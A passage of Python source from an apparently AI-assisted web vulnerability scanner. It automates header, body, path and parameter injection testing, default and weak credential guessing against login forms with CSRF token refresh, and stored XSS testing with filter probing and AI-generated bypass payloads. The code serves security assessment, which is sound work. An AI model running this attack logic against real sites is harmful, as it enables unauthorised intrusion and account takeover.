        test_params = params or list(existing_params.keys()) or ["id", "q", "search"]
        return await self._test_param_injection(
            base_url, url, vuln_type, payloads, test_params, existing_params, method
        )

    async def _test_header_injection(self, base_url: str, vuln_type: str,
                                      payloads: List[str], header_names: List[str],
                                      method: str) -> Optional[Finding]:
        """Test payloads via HTTP header injection."""
        for header_name in header_names:
            for payload in payloads[:8]:
                if self.is_cancelled():
                    return None
                dedup_key = f"{header_name}:{vuln_type}"
                if self.memory.was_tested(base_url, header_name, vuln_type):
                    continue

                try:
                    # Baseline without injection
                    baseline_resp = self.memory.get_baseline(base_url)
                    if not baseline_resp:
                        baseline_resp = await self._make_request_with_injection(
                            base_url, method, "test123",
                            injection_point="header", header_name=header_name
                        )
                        if baseline_resp:
                            self.memory.store_baseline(base_url, baseline_resp)

                    # Test with payload in header
                    test_resp = await self._make_request_with_injection(
                        base_url, method, payload,
                        injection_point="header", header_name=header_name
                    )

                    if not test_resp:
                        self.memory.record_test(base_url, header_name, vuln_type, [payload], False)
                        continue

                    # Verify: check if payload appears in response headers or body
                    is_vuln, evidence = await self._verify_vulnerability(
                        vuln_type, payload, test_resp, baseline_resp
                    )

                    # Also check for CRLF-specific indicators in response headers
                    if not is_vuln and vuln_type in ("crlf_injection", "header_injection"):
                        resp_headers = test_resp.get("headers", {})
                        resp_headers_str = str(resp_headers)
                        # Check if injected header value leaked into response
                        if any(ind in resp_headers_str.lower() for ind in
                               ["injected", "set-cookie", "x-injected", payload[:20].lower()]):
                            is_vuln = True
                            evidence = f"Header injection via {header_name}: payload reflected in response headers"

                    if is_vuln:
                        # Run through ValidationJudge pipeline
                        finding = await self._judge_finding(
                            vuln_type, base_url, header_name, payload, evidence, test_resp,
                            baseline=baseline_resp, injection_point="header"
                        )
                        if not finding:
                            self.memory.record_test(base_url, header_name, vuln_type, [payload], False)
                            continue

                        self.memory.record_test(base_url, header_name, vuln_type, [payload], True)
                        return finding

                    self.memory.record_test(base_url, header_name, vuln_type, [payload], False)

                except Exception as e:
                    await self.log("debug", f"Header injection test error: {e}")

        return None

    async def _test_body_injection(self, base_url: str, vuln_type: str,
                                    payloads: List[str], method: str) -> Optional[Finding]:
        """Test payloads via HTTP body injection (XXE, etc.)."""
        for payload in payloads[:8]:
            if self.is_cancelled():
                return None
            if self.memory.was_tested(base_url, "body", vuln_type):
                continue

            try:
                test_resp = await self._make_request_with_injection(
                    base_url, "POST", payload,
                    injection_point="body", param_name="data"
                )
                if not test_resp:
                    self.memory.record_test(base_url, "body", vuln_type, [payload], False)
                    continue

                is_vuln, evidence = await self._verify_vulnerability(
                    vuln_type, payload, test_resp, None
                )

                if is_vuln:
                    # Run through ValidationJudge pipeline
                    finding = await self._judge_finding(
                        vuln_type, base_url, "body", payload, evidence, test_resp,
                        injection_point="body"
                    )
                    if finding:
                        self.memory.record_test(base_url, "body", vuln_type, [payload], True)
                        return finding

                self.memory.record_test(base_url, "body", vuln_type, [payload], False)

            except Exception as e:
                await self.log("debug", f"Body injection test error: {e}")

        return None

    async def _test_path_injection(self, base_url: str, vuln_type: str,
                                    payloads: List[str], method: str) -> Optional[Finding]:
        """Test payloads via URL path injection (path traversal, LFI)."""
        for payload in payloads[:6]:
            if self.is_cancelled():
                return None
            if self.memory.was_tested(base_url, "path", vuln_type):
                continue

            try:
                test_resp = await self._make_request_with_injection(
                    base_url, method, payload,
                    injection_point="path"
                )
                if not test_resp:
                    self.memory.record_test(base_url, "path", vuln_type, [payload], False)
                    continue

                is_vuln, evidence = await self._verify_vulnerability(
                    vuln_type, payload, test_resp, None
                )

                if is_vuln:
                    # Run through ValidationJudge pipeline
                    finding = await self._judge_finding(
                        vuln_type, base_url, "path", payload, evidence, test_resp,
                        injection_point="path"
                    )
                    if finding:
                        self.memory.record_test(base_url, "path", vuln_type, [payload], True)
                        return finding

                self.memory.record_test(base_url, "path", vuln_type, [payload], False)

            except Exception as e:
                await self.log("debug", f"Path injection test error: {e}")

        return None

    async def _test_param_injection(self, base_url: str, url: str, vuln_type: str,
                                     payloads: List[str], test_params: List[str],
                                     existing_params: Dict, method: str) -> Optional[Finding]:
        """Test payloads via URL parameter injection (default injection method)."""
        for payload in payloads[:8]:
            for param in test_params[:5]:
                if self.is_cancelled():
                    return None
                # Skip if already tested (memory-backed dedup)
                if self.memory.was_tested(base_url, param, vuln_type):
                    continue

                try:
                    # Build request
                    test_data = {**existing_params, param: payload}

                    # Get or reuse cached baseline response
                    baseline_resp = self.memory.get_baseline(base_url)
                    if not baseline_resp:
                        baseline_resp = await self._make_request(base_url, method, {param: "test123"})
                        if baseline_resp:
                            self.memory.store_baseline(base_url, baseline_resp)
                            self.memory.store_fingerprint(base_url, baseline_resp)

                    # Test with payload
                    test_resp = await self._make_request(base_url, method, test_data)

                    if not test_resp:
                        self.memory.record_test(base_url, param, vuln_type, [payload], False)
                        continue

                    # Check for vulnerability
                    is_vuln, evidence = await self._verify_vulnerability(
                        vuln_type, payload, test_resp, baseline_resp
                    )

                    if is_vuln:
                        # Run through ValidationJudge pipeline
                        finding = await self._judge_finding(
                            vuln_type, url, param, payload, evidence, test_resp,
                            baseline=baseline_resp
                        )
                        if not finding:
                            self.memory.record_test(base_url, param, vuln_type, [payload], False)
                            continue

                        self.memory.record_test(base_url, param, vuln_type, [payload], True)
                        return finding

                    self.memory.record_test(base_url, param, vuln_type, [payload], False)

                except asyncio.TimeoutError:
                    self.memory.record_test(base_url, param, vuln_type, [payload], False)
                    # Timeout might indicate blind injection - only if significant delay
                    if vuln_type in ("sqli_time", "sqli") and "SLEEP" in payload.upper():
                        self.memory.record_test(base_url, param, vuln_type, [payload], True)
                        return self._create_finding(
                            vuln_type, url, param, payload,
                            "Request timeout - possible time-based blind SQLi",
                            {"status": "timeout"},
                            ai_confirmed=False
                        )
                except Exception as e:
                    await self.log("debug", f"Test error: {e}")

        return None

    async def _store_rejected_finding(self, vuln_type: str, url: str, param: str,
                                       payload: str, evidence: str, test_resp: Dict):
        """Store a rejected finding for manual review."""
        await self.log("debug", f"  Finding rejected after verification: {vuln_type} in {param}")
        rejected = self._create_finding(
            vuln_type, url, param, payload, evidence, test_resp,
            ai_confirmed=False
        )
        rejected.ai_status = "rejected"
        rejected.rejection_reason = f"AI verification rejected: {vuln_type} in {param} - payload detected but not confirmed exploitable"
        self.rejected_findings.append(rejected)
        self.memory.reject_finding(rejected, rejected.rejection_reason)
        if self.finding_callback:
            try:
                await self.finding_callback(asdict(rejected))
            except Exception:
                pass

    # ── Stored XSS: Two-phase form-based testing ──────────────────────────

    def _get_display_pages(self, form: Dict) -> List[str]:
        """Determine likely display pages where stored content would render."""
        display_pages = []
        action = form.get("action", "")
        page_url = form.get("page_url", "")

        # 1. The page containing the form (most common: comments appear on same page)
        if page_url and page_url not in display_pages:
            display_pages.append(page_url)

        # 2. Form action URL (sometimes redirects back to content page)
        if action and action not in display_pages:
            display_pages.append(action)

        # 3. Parent path (e.g., /post/comment → /post)
        parsed = urlparse(page_url or action)
        parent = parsed.path.rsplit("/", 1)[0]
        if parent and parent != parsed.path:
            parent_url = f"{parsed.scheme}://{parsed.netloc}{parent}"
            if parent_url not in display_pages:
                display_pages.append(parent_url)

        # 4. Main target
        if self.target not in display_pages:
            display_pages.append(self.target)

        return display_pages

    async def _fetch_fresh_form_values(self, page_url: str, form_action: str) -> List[Dict]:
        """Fetch a page and extract fresh hidden input values (CSRF tokens, etc.)."""
        try:
            resp = await self._make_request(page_url, "GET", {})
            if not resp:
                return []
            body = resp.get("body", "")

            # Capture <form> tag attributes and inner content separately
            form_pattern = r'<form([^>]*)>(.*?)</form>'
            forms = re.findall(form_pattern, body, re.I | re.DOTALL)

            parsed_action = urlparse(form_action)
            for form_attrs, form_html in forms:
                # Match action from the <form> tag attributes
                action_match = re.search(r'action=["\']([^"\']*)["\']', form_attrs, re.I)
                if action_match:
                    found_action = action_match.group(1)
                    if found_action == parsed_action.path or form_action.endswith(found_action):
                        # Extract fresh input values from inner content
                        details = []
                        for inp_el in re.findall(r'<input[^>]*>', form_html, re.I):
                            name_m = re.search(r'name=["\']([^"\']+)["\']', inp_el, re.I)
                            if not name_m:
                                continue
                            type_m = re.search(r'type=["\']([^"\']+)["\']', inp_el, re.I)
                            val_m = re.search(r'value=["\']([^"\']*)["\']', inp_el, re.I)
                            details.append({
                                "name": name_m.group(1),
                                "type": type_m.group(1).lower() if type_m else "text",
                                "value": val_m.group(1) if val_m else ""
                            })
                        for ta in re.findall(r'<textarea[^>]*name=["\']([^"\']+)["\']', form_html, re.I):
                            details.append({"name": ta, "type": "textarea", "value": ""})
                        return details
        except Exception:
            pass
        return []

    async def _test_form_auth(self) -> List[Finding]:
        """Test login forms for default/weak credentials.

        Identifies forms with a password field, maps username/password fields,
        and submits credential pairs using the existing testers' response
        analysis logic.

        Returns:
            List of confirmed findings (at most one per form).
        """
        from backend.core.vuln_engine.testers.auth import (
            DefaultCredentialsTester,
            WeakPasswordTester,
        )

        USERNAME_HINTS = {"username", "user", "email", "login", "name", "usr", "uid"}
        PASSWORD_HINTS = {"password", "pass", "pwd", "passwd", "secret"}

        default_tester = DefaultCredentialsTester()
        weak_tester = WeakPasswordTester()

        # Identify forms with a password field
        login_forms = []
        for form in self.recon.forms:
            details = form.get("input_details", [])
            has_password = any(
                d.get("type") == "password"
                for d in details if isinstance(d, dict)
            )
            if has_password:
                login_forms.append(form)

        if not login_forms:
            await self.log("info", "  [FORM AUTH] No login forms found")
            return []

        await self.log("info", f"  [FORM AUTH] Found {len(login_forms)} login form(s)")

        # Build credential pairs: default_creds + weak passwords with "admin" user
        cred_pairs = list(default_tester.default_creds)
        for pw in weak_tester.weak_passwords:
            pair = ("admin", pw)
            if pair not in cred_pairs:
                cred_pairs.append(pair)
        # Cap at 20 to limit request volume
        cred_pairs = cred_pairs[:20]

        findings: List[Finding] = []

        for form in login_forms[:5]:
            action = form.get("action", "")
            method = form.get("method", "POST").upper()
            page_url = form.get("page_url", action)
            details = form.get("input_details", [])

            if not action:
                continue

            # Identify username and password field names
            user_field = None
            pass_field = None
            for d in details:
                if not isinstance(d, dict):
                    continue
                name_lower = d.get("name", "").lower()
                if d.get("type") == "password":
                    pass_field = d["name"]
                elif any(h in name_lower for h in USERNAME_HINTS):
                    user_field = d["name"]

            if not pass_field:
                continue
            if not user_field:
                # Fallback: first text/email field that isn't hidden
                for d in details:
                    if not isinstance(d, dict):
                        continue
                    if d.get("type") in ("text", "email", ""):
                        user_field = d["name"]
                        break
            if not user_field:
                continue

            await self.log(
                "info",
                f"    [FORM AUTH] Testing {page_url[:60]} "
                f"(user={user_field}, pass={pass_field})",
            )

            # Identify hidden fields (CSRF tokens, etc.)
            hidden_fields: Dict[str, str] = {}
            csrf_field_names: List[str] = []
            for d in details:
                if not isinstance(d, dict):
                    continue
                if d.get("type") == "hidden":
                    hidden_fields[d["name"]] = d.get("value", "")
                    if any(tok in d["name"].lower() for tok in ("csrf", "token", "_token", "nonce")):
                        csrf_field_names.append(d["name"])

            form_found = False
            for username, password in cred_pairs:
                if self.is_cancelled():
                    return findings

                # Rate limit
                await asyncio.sleep(0.333)

                # Refresh CSRF tokens if applicable
                if csrf_field_names:
                    fresh = await self._fetch_fresh_form_values(page_url, action)
                    if fresh:
                        for fd in fresh:
                            if fd.get("type") == "hidden" and fd.get("name") in hidden_fields:
                                hidden_fields[fd["name"]] = fd.get("value", "")

                # Build form data
                form_data: Dict[str, str] = {}
                form_data.update(hidden_fields)
                form_data[user_field] = username
                form_data[pass_field] = password

                resp = await self._make_request(action, method, form_data)
                if not resp:
                    continue

                payload_str = f"{username}:{password}"
                context: Dict = {"form_action": action, "page_url": page_url}

                # Check with DefaultCredentialsTester
                confirmed, confidence, detail = default_tester.analyze_response(
                    payload_str,
                    resp.get("status", 0),
                    resp.get("headers", {}),
                    resp.get("body", ""),
                    context,
                )

                # If not caught by default creds, try weak password tester
                if not confirmed:
                    confirmed, confidence, detail = weak_tester.analyze_response(
                        payload_str,
                        resp.get("status", 0),
                        resp.get("headers", {}),
                        resp.get("body", ""),
                        context,
                    )

                if confirmed and detail:
                    finding_id = hashlib.md5(
                        f"form_auth_{action}_{username}_{password}".encode()
                    ).hexdigest()[:12]

                    finding = Finding(
                        id=finding_id,
                        title=f"Default/Weak Credentials Accepted: {username}/{password}",
                        severity="high",
                        vulnerability_type="default_credentials",
                        description=(
                            f"The login form at {action} accepts default/weak "
                            f"credentials ({username}/{password}). {detail}"
                        ),
                        affected_endpoint=action,
                        parameter=f"{user_field}, {pass_field}",
                        payload=payload_str,
                        evidence=(
                            f"Submitted {method} to {action} with "
                            f"{user_field}={username}&{pass_field}={password}. "
                            f"Response status: {resp.get('status')}. "
                            f"Analysis: {detail}"
                        ),
                        request=f"{method} {action} ({user_field}={username}&{pass_field}=***)",
                        response=f"HTTP {resp.get('status', 0)} - {resp.get('body', '')[:300]}",
                        impact="Unauthorized access to the application with default credentials",
                        remediation=(
                            "Remove default credentials, enforce strong password policy, "
                            "implement account lockout after failed attempts"
                        ),
                        cwe_id="CWE-798",
                        confidence=str(int(confidence * 100)),
                        confidence_score=int(confidence * 100),
                    )
                    findings.append(finding)
                    await self.log(
                        "warning",
                        f"    [FORM AUTH] CONFIRMED: {username}/{password} at {action[:60]}",
                    )
                    form_found = True
                    break  # One finding per form is enough

            if not form_found:
                await self.log("info", f"    [FORM AUTH] No default/weak creds accepted at {action[:60]}")

        return findings

    async def _test_stored_xss(self, form: Dict) -> Optional[Finding]:
        """AI-driven two-phase stored XSS testing for a form.

        Phase 1: Submit XSS payloads to form action (with fresh CSRF tokens)
        Phase 2: Check display pages for unescaped payload execution
        Uses AI to analyze form structure, adapt payloads, and verify results.
        """
        action = form.get("action", "")
        method = form.get("method", "POST").upper()
        inputs = form.get("inputs", [])
        input_details = form.get("input_details", [])
        page_url = form.get("page_url", action)

        if not action or not inputs:
            return None

        # Use page_url as unique key for dedup (not action, which may be shared)
        dedup_key = page_url or action

        await self.log("info", f"  [STORED XSS] Testing form on {page_url[:60]}...")
        await self.log("info", f"    Action: {action[:60]}, Method: {method}, Inputs: {inputs}")

        # Check for CSRF-protected forms
        has_csrf = any(
            d.get("type") == "hidden" and "csrf" in d.get("name", "").lower()
            for d in input_details if isinstance(d, dict)
        )

        # Identify hidden fields and their values
        hidden_fields = {}
        for d in input_details:
            if isinstance(d, dict) and d.get("type") == "hidden":
                hidden_fields[d["name"]] = d.get("value", "")
        if hidden_fields:
            await self.log("info", f"    [HIDDEN] {list(hidden_fields.keys())} (CSRF={has_csrf})")

        display_pages = self._get_display_pages(form)

        # Identify injectable text fields (skip hidden/submit)
        text_fields = []
        text_indicators = [
            "comment", "message", "text", "body", "content", "desc",
            "title", "subject", "review", "feedback", "note",
            "post", "reply", "bio", "about",
        ]
        for inp_d in input_details:
            if isinstance(inp_d, dict):
                name = inp_d.get("name", "")
                inp_type = inp_d.get("type", "text")
                if inp_type in ("hidden", "submit"):
                    continue
                if inp_type == "textarea" or any(ind in name.lower() for ind in text_indicators):
                    text_fields.append(name)

        # Fallback: use all non-hidden, non-submit inputs
        if not text_fields:
            for inp_d in input_details:
                if isinstance(inp_d, dict) and inp_d.get("type") not in ("hidden", "submit"):
                    text_fields.append(inp_d.get("name", ""))

        if not text_fields:
            await self.log("debug", f"    No injectable text fields found")
            return None

        await self.log("info", f"    [FIELDS] Injectable: {text_fields}")

        # ── Step 1: Canary probe to verify form submission works ──
        canary = f"xsscanary{hashlib.md5(page_url.encode()).hexdigest()[:6]}"
        canary_stored = False
        canary_display_url = None
        context = "unknown"

        fresh_details = await self._fetch_fresh_form_values(page_url, action) if has_csrf else input_details
        if not fresh_details:
            fresh_details = input_details

        probe_data = self._build_form_data(fresh_details, text_fields, canary)
        await self.log("info", f"    [PROBE] Submitting canary '{canary}' to verify form works...")
        await self.log("debug", f"    [PROBE] POST data keys: {list(probe_data.keys())}")

        try:
            probe_resp = await self._make_request(action, method, probe_data)
            if probe_resp:
                p_status = probe_resp.get("status", 0)
                p_body = probe_resp.get("body", "")
                await self.log("info", f"    [PROBE] Response: status={p_status}, body_len={len(p_body)}")

                # Check if canary appears in the response itself (immediate display)
                if canary in p_body:
                    await self.log("info", f"    [PROBE] Canary found in submission response!")
                    canary_stored = True
                    canary_display_url = action

                # Follow redirect
                if p_status in (301, 302, 303):
                    loc = probe_resp.get("headers", {}).get("Location", "")
                    await self.log("info", f"    [PROBE] Redirect to: {loc}")
                    if loc:
                        if loc.startswith("/"):
                            parsed = urlparse(action)
                            loc = f"{parsed.scheme}://{parsed.netloc}{loc}"
                        if loc not in display_pages:
                            display_pages.insert(0, loc)
                        # Follow the redirect to check for canary
                        redir_resp = await self._make_request(loc, "GET", {})
                        if redir_resp and canary in redir_resp.get("body", ""):
                            await self.log("info", f"    [PROBE] Canary found on redirect page!")
                            canary_stored = True
                            canary_display_url = loc

                # Check display pages for canary
                if not canary_stored:
                    for dp_url in display_pages:
                        dp_resp = await self._make_request(dp_url, "GET", {})
                        if dp_resp and canary in dp_resp.get("body", ""):
                            await self.log("info", f"    [PROBE] Canary found on display page: {dp_url[:60]}")
                            canary_stored = True
                            canary_display_url = dp_url
                            break
                        elif dp_resp:
                            await self.log("debug", f"    [PROBE] Canary NOT found on {dp_url[:60]} (body_len={len(dp_resp.get('body',''))})")

                if not canary_stored:
                    await self.log("warning", f"    [PROBE] Canary not found on any display page - form may not store data")
                    # Try AI analysis of why submission might have failed
                    if self.llm.is_available() and p_body:
                        ai_hint = await self.llm.generate(
                            f"I submitted a form to {action} with fields {list(probe_data.keys())}. "
                            f"Got status {p_status}. Response body excerpt:\n{p_body[:1500]}\n\n"
                            f"Did the submission succeed? If not, what's wrong? "
                            f"Look for error messages, missing fields, validation failures. "
                            f"Reply in 1-2 sentences.",
                            get_system_prompt("interpretation"),
                            task_type="form_analysis",
                        )
                        await self.log("info", f"    [AI] Form analysis: {ai_hint[:150]}")
                    return None  # Don't waste time if form doesn't store

        except Exception as e:
            await self.log("debug", f"    Context probe failed: {e}")
            return None

        # ── Step 2: Enhanced context detection ──
        context_info = {"context": "html_body"}
        if canary_display_url:
            try:
                ctx_resp = await self._make_request(canary_display_url, "GET", {})
                if ctx_resp and canary in ctx_resp.get("body", ""):
                    context_info = self._detect_xss_context_enhanced(ctx_resp["body"], canary)
                    await self.log("info", f"    [CONTEXT] Detected: {context_info['context']} "
                                  f"(tag={context_info.get('enclosing_tag', 'none')}, "
                                  f"attr={context_info.get('attribute_name', 'none')})")
            except Exception:
                pass

        context = context_info["context"]

        # ── Step 2.5: Filter detection ──
        form_context_for_filter = {
            "text_fields": text_fields,
            "input_details": input_details,
            "action": action,
            "method": method,
            "display_url": canary_display_url or page_url,
            "page_url": page_url,
            "has_csrf": has_csrf,
        }
        filter_map = await self._detect_xss_filters(
            page_url, text_fields[0] if text_fields else "",
            form_context=form_context_for_filter
        )

        # ── Step 3: Build adaptive payload list ──
        # 3a: Context payloads from PayloadGenerator
        context_payloads = self.payload_generator.get_context_payloads(context)

        # 3b: Escalation payloads filtered by what's allowed
        escalation = self._escalation_payloads(filter_map, context)

        # 3c: Filter bypass payloads from generator
        bypass_payloads = self.payload_generator.get_filter_bypass_payloads(filter_map)

        # 3d: AI-generated payloads
        challenge_hint = self.lab_context.get("challenge_name", "") or ""
        if self.lab_context.get("notes"):
            challenge_hint += f" | {self.lab_context['notes']}"
        ai_payloads = await self._ai_generate_xss_payloads(
            filter_map, context_info, challenge_hint
        )

        # Merge and deduplicate: AI first (most targeted), then escalation, then static
        seen: set = set()
        payloads: List[str] = []
        for p in (ai_payloads + escalation + bypass_payloads + context_payloads):
            if p not in seen:
                seen.add(p)
                payloads.append(p)

        if not payloads:
            payloads = self._get_payloads("xss_stored")

        await self.log("info", f"    [PAYLOADS] {len(payloads)} total "
                       f"(AI={len(ai_payloads)}, escalation={len(escalation)}, "
                       f"bypass={len(bypass_payloads)}, context={len(context_payloads)})")

        # ── Step 4: Submit payloads and verify on display page ──
        tester = self.vuln_registry.get_tester("xss_stored")
        param_key = ",".join(text_fields)

        for i, payload in enumerate(payloads[:15]):
            await self._wait_if_paused()
            if self.is_cancelled():
                return None

            # Per-payload dedup using page_url (not action, which is shared across forms)
            payload_hash = hashlib.md5(payload.encode()).hexdigest()[:8]
            dedup_param = f"{param_key}|{payload_hash}"
            if self.memory.was_tested(dedup_key, dedup_param, "xss_stored"):
                continue

            # Fetch fresh CSRF token for each submission
            current_details = input_details
            if has_csrf:
                fetched = await self._fetch_fresh_form_values(page_url, action)
                if fetched:
                    current_details = fetched

            form_data = self._build_form_data(current_details, text_fields, payload)

            try:
                # Phase 1: Submit payload
                submit_resp = await self._make_request(action, method, form_data)
                if not submit_resp:
                    self.memory.record_test(dedup_key, dedup_param, "xss_stored", [payload], False)
                    continue

                s_status = submit_resp.get("status", 0)
                s_body = submit_resp.get("body", "")

                if s_status >= 400:
                    await self.log("debug", f"    [{i+1}] Phase 1 rejected (status {s_status})")
                    self.memory.record_test(dedup_key, dedup_param, "xss_stored", [payload], False)
                    continue

                await self.log("info", f"    [{i+1}] Phase 1 OK (status={s_status}): {payload[:50]}...")

                # Phase 2: Check where the payload ended up
                # Start with the known display URL from canary, then check others
                check_urls = []
                if canary_display_url:
                    check_urls.append(canary_display_url)
                # Follow redirect
                if s_status in (301, 302, 303):
                    loc = submit_resp.get("headers", {}).get("Location", "")
                    if loc:
                        if loc.startswith("/"):
                            parsed = urlparse(action)
                            loc = f"{parsed.scheme}://{parsed.netloc}{loc}"
                        if loc not in check_urls:
                            check_urls.append(loc)
                # Add remaining display pages
                for dp in display_pages:
                    if dp not in check_urls:
                        check_urls.append(dp)

                for dp_url in check_urls:
                    try:
                        dp_resp = await self._make_request(dp_url, "GET", {})
                        if not dp_resp:
                            continue

                        dp_body = dp_resp.get("body", "")

                        # Check with tester
                        phase2_detected, phase2_conf, phase2_evidence = tester.analyze_display_response(
                            payload, dp_resp.get("status", 0),
                            dp_resp.get("headers", {}),
                            dp_body, {}
                        )

                        if phase2_detected and phase2_conf >= 0.7:
                            await self.log("warning",
                                f"    [{i+1}] [XSS STORED] Phase 2 CONFIRMED (conf={phase2_conf:.2f}): {phase2_evidence[:80]}")

                            # For stored XSS with high-confidence Phase 2 tester match,
                            # skip the generic AI confirmation — the tester already verified
                            # the payload exists unescaped on the display page.
                            # The AI prompt doesn't understand two-phase stored XSS context
                            # and rejects legitimate findings because it only sees a page excerpt.
                            await self.log("info", f"    [{i+1}] Phase 2 tester confirmed with {phase2_conf:.2f} — accepting finding")

                            # Browser verification if available
                            browser_evidence = ""
                            screenshots = []
                            if self.browser_validation_enabled and HAS_PLAYWRIGHT and BrowserValidator is not None:
                                browser_result = await self._browser_verify_stored_xss(
                                    form, payload, text_fields, dp_url
                                )
                                if browser_result:
                                    browser_evidence = browser_result.get("evidence", "")
                                    screenshots = [s for s in browser_result.get("screenshots", []) if s]
                                    if browser_result.get("xss_confirmed"):
                                        await self.log("warning", "    [BROWSER] Stored XSS confirmed!")

                            evidence = phase2_evidence
                            if browser_evidence:
                                evidence += f" | Browser: {browser_evidence}"

                            self.memory.record_test(dedup_key, dedup_param, "xss_stored", [payload], True)

                            finding = self._create_finding(
                                "xss_stored", dp_url, param_key, payload,
                                evidence, dp_resp, ai_confirmed=True
                            )
                            finding.affected_urls = [action, dp_url]

                            if screenshots and embed_screenshot:
                                for ss_path in screenshots:
                                    data_uri = embed_screenshot(ss_path)
                                    if data_uri:
                                        finding.screenshots.append(data_uri)

                            return finding
                        else:
                            # Log what we found (or didn't)
                            if payload in dp_body:
                                await self.log("info", f"    [{i+1}] Payload found on page but encoded/safe (conf={phase2_conf:.2f})")
                            else:
                                await self.log("debug", f"    [{i+1}] Payload NOT on display page {dp_url[:50]}")

                    except Exception as e:
                        await self.log("debug", f"    [{i+1}] Display page error: {e}")

                self.memory.record_test(dedup_key, dedup_param, "xss_stored", [payload], False)

            except Exception as e:
                await self.log("debug", f"    [{i+1}] Stored XSS error: {e}")

        return None

    def _build_form_data(self, input_details: List[Dict], text_fields: List[str],
                         payload_value: str) -> Dict[str, str]:
        """Build form submission data using hidden field values and injecting payload into text fields."""
        form_data = {}
        for inp in input_details:
            name = inp.get("name", "") if isinstance(inp, dict) else inp
            inp_type = inp.get("type", "text") if isinstance(inp, dict) else "text"
            inp_value = inp.get("value", "") if isinstance(inp, dict) else ""

            if inp_type == "hidden":
                # Use actual hidden value (csrf token, postId, etc.)
                form_data[name] = inp_value
            elif name in text_fields:
                form_data[name] = payload_value
            elif name.lower() in ("email",):
                form_data[name] = "test@test.com"
            elif name.lower() in ("website", "url"):
                form_data[name] = "http://test.com"
            elif name.lower() in ("name",):
                form_data[name] = "TestUser"
            elif inp_type == "textarea":
                form_data[name] = payload_value
            else:
                form_data[name] = inp_value if inp_value else "test"
        return form_data

    # ==================== ADAPTIVE XSS ENGINE ====================

    def _detect_xss_context_enhanced(self, body: str, canary: str) -> Dict[str, Any]:
        """Enhanced XSS context detection supporting 12+ injection contexts.

        Returns dict with: context, before_context, after_context, enclosing_tag,
        attribute_name, quote_char, can_break_out
        """
        result = {
            "context": "unknown",
            "before_context": "",
            "after_context": "",
            "enclosing_tag": "",
            "attribute_name": "",
            "quote_char": "",
            "can_break_out": True,
        }

        idx = body.find(canary)
        if idx == -1:
            return result

        before = body[max(0, idx - 150):idx]
        after = body[idx + len(canary):idx + len(canary) + 80]
        result["before_context"] = before
        result["after_context"] = after
        before_lower = before.lower()

        # Safe containers (block execution, need breakout)
        if re.search(r'<textarea[^>]*>[^<]*$', before_lower, re.DOTALL):
            result["context"] = "textarea"
            return result
        if re.search(r'<title[^>]*>[^<]*$', before_lower, re.DOTALL):
            result["context"] = "title"
            return result
        if re.search(r'<noscript[^>]*>[^<]*$', before_lower, re.DOTALL):
            result["context"] = "noscript"
            return result

        # HTML comment
        if '<!--' in before and '-->' not in before[before.rfind('<!--'):]:
            result["context"] = "html_comment"
            return result

        # SVG context
        if '<svg' in before_lower and '</svg>' not in before_lower[before_lower.rfind('<svg'):]:
            result["context"] = "svg_context"
            return result

        # MathML context
        if '<math' in before_lower and '</math>' not in before_lower[before_lower.rfind('<math'):]:
            result["context"] = "mathml_context"
            return result

        # Style block
        if re.search(r'<style[^>]*>[^<]*$', before_lower, re.DOTALL):
            result["context"] = "style"
            return result

        # JavaScript template literal (backtick string)
        if re.search(r'`[^`]*$', before):
            result["context"] = "js_template_literal"
            return result

        # Script context
        if re.search(r'<script[^>]*>[^<]*$', before_lower, re.DOTALL):
            if re.search(r"'[^']*$", before):
                result["context"] = "js_string_single"
                result["quote_char"] = "'"
            elif re.search(r'"[^"]*$', before):
                result["context"] = "js_string_double"
                result["quote_char"] = '"'
            else:
                result["context"] = "js_string_single"
            return result

        # Attribute context
        attr_match = re.search(
            r'<(\w+)\b[^>]*\s(\w[\w-]*)\s*=\s*(["\']?)([^"\']*?)$',
            before, re.IGNORECASE | re.DOTALL
        )
        if attr_match:
            result["enclosing_tag"] = attr_match.group(1).lower()
            result["attribute_name"] = attr_match.group(2).lower()
            result["quote_char"] = attr_match.group(3)

            if result["attribute_name"] in ("href", "action", "formaction"):
                result["context"] = "href"
            elif result["attribute_name"] == "src":
                result["context"] = "script_src"
            elif result["attribute_name"] in ("onclick", "onload", "onerror", "onfocus",
                                               "onmouseover", "onchange", "onsubmit"):
                result["context"] = "event_handler"
            elif result["quote_char"] == '"':
                result["context"] = "attribute_double"
            elif result["quote_char"] == "'":
                result["context"] = "attribute_single"
            else:
                result["context"] = "attribute_unquoted"
            return result

        # Default: HTML body
        result["context"] = "html_body"
        return result

    async def _detect_xss_filters(
        self, url: str, param: str, method: str = "GET",
        form_context: Optional[Dict] = None
    ) -> Dict[str, Any]:
        """Probe target to detect which XSS characters, tags, and events are filtered.

        Works for both reflected (GET param) and stored (POST form + display page) via form_context.
        Returns filter_map with chars_allowed/blocked, tags_allowed/blocked, events_allowed/blocked.
        """
        filter_map: Dict[str, Any] = {
            "chars_allowed": [], "chars_blocked": [],
            "tags_allowed": [], "tags_blocked": [],
            "events_allowed": [], "events_blocked": [],
            "encoding_behavior": "unknown",
            "csp_policy": None,
            "waf_detected": False,
        }

        await self.log("info", f"    [FILTER] Probing character/tag/event filters...")

        async def _send_probe(probe_value: str) -> Optional[str]:
            """Send probe and return the body where output appears."""
            if form_context:
                text_fields = form_context.get("text_fields", [])
                details = form_context.get("input_details", [])
                action = form_context.get("action", url)
                fm = form_context.get("method", "POST")
                display_url = form_context.get("display_url", url)
                # Fetch fresh CSRF if needed
                if form_context.get("has_csrf"):
                    fetched = await self._fetch_fresh_form_values(
                        form_context.get("page_url", url), action
                    )
                    if fetched:
                        details = fetched
                data = self._build_form_data(details, text_fields, probe_value)
                resp = await self._make_request(action, fm, data)
                if resp and resp.get("status", 0) < 400:
                    disp = await self._make_request(display_url, "GET", {})
                    if disp:
                        return disp.get("body", "")
                return None
            else:
                resp = await self._make_request(url, method, {param: probe_value})
                return resp.get("body", "") if resp else None

        # Phase A: Character probing (batch — send all chars in one probe)
        test_chars = ['<', '>', '"', "'", '/', '(', ')', '`', '{', '}', ';', '=']
        batch_canary = f"nsc{hashlib.md5(url.encode()).hexdigest()[:4]}"
        batch_probe = ""
        for ch in test_chars:
            batch_probe += f"{batch_canary}{ch}"
        batch_probe += batch_canary

        body = await _send_probe(batch_probe)
        if body:
            for ch in test_chars:
                marker = f"{batch_canary}{ch}"
                if marker in body:
                    filter_map["chars_allowed"].append(ch)
                elif batch_canary in body:
                    filter_map["chars_blocked"].append(ch)
                    if ch == "<" and "&lt;" in body:
                        filter_map["encoding_behavior"] = "html_entity"
                else:
                    filter_map["chars_blocked"].append(ch)

